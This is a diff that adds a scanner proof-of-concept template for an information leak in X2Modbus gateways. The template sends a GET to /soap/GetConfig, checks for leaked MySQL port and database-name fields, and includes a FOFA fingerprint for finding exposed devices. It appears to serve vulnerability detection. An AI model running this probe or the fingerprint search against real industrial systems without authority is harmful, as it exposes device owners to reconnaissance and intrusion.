@@ -1,0 +1,26 @@
+id: poc-yaml-x2modbus-getconfig-info-leak
+info:
+  name: X2Modbus网关 GetConfig 信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: X2Modbus
+  fofa: icon_hash="-1384370370"
+requests:
+- method: GET
+  path: /soap/GetConfig
+  expression: 'status_code == 200 &&
+
+    contains(body,"MySQL") &&
+
+    contains(body,"X2Web") &&
+
+    matches(body,"DBPort=\"([0-9]{1,5})\"") &&
+
+    matches(body,"DBName=\"([0-9a-zA-Z]+)\"") &&
+
+    contains(content_type,"text/xml")
+
+    '
+variables: {}
+transport: http
